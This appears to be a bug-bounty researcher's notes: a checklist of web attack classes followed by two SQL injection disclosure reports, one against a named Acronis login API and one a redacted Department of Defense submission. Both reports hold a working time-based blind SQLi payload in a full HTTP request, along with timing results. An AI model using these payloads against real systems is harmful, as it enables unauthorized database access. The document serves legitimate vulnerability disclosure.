# road

* SSTI (Username and tools)
* sqli 
* File Upload Vulnerabilities
* SSRF Scan
* web cache poisoning
* Os Command Injection
* Path Traversal Injection
* LFI
* 0Auth Injection


A1: Injection
0
0
A2: Broken Authentication
0
0
A3: Sensitive Data Exposure
0
0
A4: XML External Entities (XXE)
0
0
A5: Broken Access Control
0
0
A6: Security Misconfiguration
0
N/A
A7: Cross-Site Scripting (XSS)
0
0
A8: Insecure Deserialization
0
N/A
A9: Using Components with Known Vulnerabilities
N/A
N/A
A10: Insufficient Logging & Monitoring

# Sqli Reports 
## 1

I have discovered a SQL injection in https://demor.adr.acronis.com/ using the POST request via the username parameter.
Using the Repearter in Burpsuite I have submitted the following POST request:
```http
POST /ng/api/auth/login HTTP/2
Host: demor.adr.acronis.com
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: https://demor.adr.acronis.com/
Cookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Encoding: gzip,deflate,br
Content-Length: 148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}
```
Which resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).
Using various values for the sleep function you get various time responses.
```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337
```

I have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.

____________________

## 2 
 -
-

newcodeslayer137 submitted a report to U.S. Dept Of Defense.
June 10, 2023, 9:32am UTC

Description:
found on the websitehttps://████████ weakness is vulnerable to a blind sql injection.
POC: https:/█████████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
Tests Payload performed:
```
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927
```
Impact
An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
Best regards,
CodeSlayer137
System Host(s)
███
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
```https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896```
Suggested Mitigation/Remediation Actions
